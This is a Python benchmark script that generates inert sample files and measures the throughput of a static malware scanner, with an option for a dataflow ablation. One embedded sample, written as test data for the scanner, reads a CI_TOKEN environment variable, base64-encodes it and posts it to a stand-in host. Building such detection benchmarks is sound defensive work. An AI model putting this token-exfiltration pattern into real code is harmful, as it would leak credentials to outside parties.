#!/usr/bin/env python3
"""Generate inert files and measure end-to-end static scan throughput."""

from __future__ import annotations

import argparse
import json
import tempfile
from pathlib import Path

from malir.benchmark import benchmark_dataflow_ablation, benchmark_scan
from malir.scanner import Scanner

SAFE_SOURCE = """\
import json
from pathlib import Path

def summarize(path):
    data = json.loads(Path(path).read_text())
    return {"items": len(data)}
"""

SUSPICIOUS_SOURCE = """\
import base64
import os
import requests

def never_called():
    value = os.getenv("CI_TOKEN")
    data = base64.b64encode(value.encode())
    requests.post("https://example.invalid", data=data)
"""


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--files", type=int, default=1_000)
    parser.add_argument("--repeats", type=int, default=5)
    mode = parser.add_mutually_exclusive_group()
    mode.add_argument("--no-dataflow", action="store_true")
    mode.add_argument("--compare-dataflow", action="store_true")
    args = parser.parse_args()
    with tempfile.TemporaryDirectory(prefix="malir-bench-") as directory:
        root = Path(directory)
        for index in range(args.files):
            source = SUSPICIOUS_SOURCE if index % 20 == 0 else SAFE_SOURCE
            (root / f"sample_{index:05d}.py").write_text(
                source,
                encoding="utf-8",
            )
        if args.compare_dataflow:
            output = benchmark_dataflow_ablation(root, repeats=args.repeats)
        else:
            output = benchmark_scan(
                root,
                repeats=args.repeats,
                scanner=Scanner(enable_dataflow=not args.no_dataflow),
            )
    print(json.dumps(output, indent=2, sort_keys=True))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
